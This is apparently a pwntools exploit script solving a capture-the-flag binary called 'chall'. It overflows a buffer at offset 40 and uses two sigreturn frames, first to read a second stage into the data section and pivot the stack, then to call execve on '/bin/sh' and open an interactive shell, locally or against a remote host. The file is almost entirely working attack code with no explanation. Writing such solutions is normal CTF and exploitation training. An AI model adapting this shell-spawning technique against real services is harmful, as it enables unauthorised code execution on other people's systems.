#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *super_program+55
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 40

    syscall = 0x401058
    data_section = 0x402048

    frame = SigreturnFrame()
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = data_section
    frame.rdx = 0x500
    frame.rsp = data_section + 8
    frame.rbp = data_section
    frame.rip = syscall

    payload = flat({
        offset: [
            exe.sym["super_program"],
            syscall,
            frame
        ]
    })


    spawn_shell = SigreturnFrame()
    spawn_shell.rdi = data_section
    spawn_shell.rsi = 0
    spawn_shell.rdx = 0
    spawn_shell.rax = 0x3b
    spawn_shell.rip = syscall

    stage_two = flat(
        [
            exe.sym["super_program"]
        ]
    )

    pivot = b"/bin/sh\x00" + stage_two + p64(syscall) + bytes(spawn_shell)

    io.sendafter(b":)", payload)
    io.sendafter(b":)", b"A"*0xf)
    io.send(pivot)
    io.sendlineafter(b":)", b"A"*0xe)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

